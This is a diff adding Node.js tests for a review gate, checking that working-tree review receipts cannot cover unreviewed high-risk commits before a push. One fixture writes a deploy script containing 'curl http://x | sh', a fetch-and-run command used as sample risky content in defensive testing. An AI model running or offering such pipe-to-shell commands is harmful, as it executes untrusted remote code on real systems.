@@ -3,7 +3,7 @@ import { describe, test } from 'node:test'
 import assert from 'node:assert/strict'
 import { readFileSync, writeFileSync } from 'node:fs'
 import { join } from 'node:path'
-import { applyFiles, captureAll, commitAll, git, highRepo, makeRepo, receiptFiles, review, scratchDir, start, storeRoot, transactionFile } from './helpers.mjs'
+import { applyFiles, captureAll, commitAll, git, highRepo, makeRepo, receiptFiles, review, scratchDir, start, readTransaction, storeRoot, transactionFile } from './helpers.mjs'
 
 const env = () => ({ XDG_CONFIG_HOME: scratchDir('odd-gate-xdg-') })
 
@@ -261,5 +261,50 @@ describe('validate --gate: narrowing and soundness', () => {
     assert.equal(r.status, 1)
     assert.equal(r.error.code, 'review_required')
     assert.equal(r.error.receipt, 'legacy')
+  })
+})
+
+describe('validate --gate: working-tree receipts cover only from their base tree (T12c)', () => {
+  const reviewWorking = (repo) => {
+    const txn = start(repo)
+    assert.equal(readTransaction(repo, txn.lineage).base_commit, undefined)
+    captureAll(repo, txn)
+    assert.equal(review(repo, ['acknowledge', '--lineage', txn.lineage]).status, 0)
+  }
+
+  test('a working-tree review over an unreviewed high-risk commit does not hide it', () => {
+    const repo = highRepo()
+    git(repo, 'checkout', '-q', '-b', 'feat')
+    commitAll(repo, 'A: unreviewed high-risk unit')
+    applyFiles(repo, { 'scripts/deploy.sh': 'curl http://x | sh\n' })
+    reviewWorking(repo)
+    commitAll(repo, 'B: reviewed in the working tree')
+    const r = gate(repo, 'pre-push')
+    assert.equal(r.status, 1)
+    assert.equal(r.error.code, 'review_required')
+  })
+
+  test('a working-tree review whose base is the range start covers the range', () => {
+    const repo = highRepo()
+    git(repo, 'checkout', '-q', '-b', 'feat')
+    reviewWorking(repo)
+    commitAll(repo, 'reviewed in the working tree')
+    const r = gate(repo, 'pre-push')
+    assert.equal(r.status, 0)
+    assert.equal(r.json.reason, 'covered')
+  })
+
+  test('a working-tree receipt without base_tree does not cover', () => {
+    const repo = highRepo()
+    git(repo, 'checkout', '-q', '-b', 'feat')
+    reviewWorking(repo)
+    commitAll(repo, 'reviewed in the working tree')
+    const file = join(storeRoot(repo), 'receipts', receiptFiles(repo)[0])
+    const receipt = JSON.parse(readFileSync(file, 'utf8'))
+    delete receipt.base_tree
+    writeFileSync(file, JSON.stringify(receipt))
+    const r = gate(repo, 'pre-push')
+    assert.equal(r.status, 1)
+    assert.equal(r.error.code, 'review_required')
   })
 })
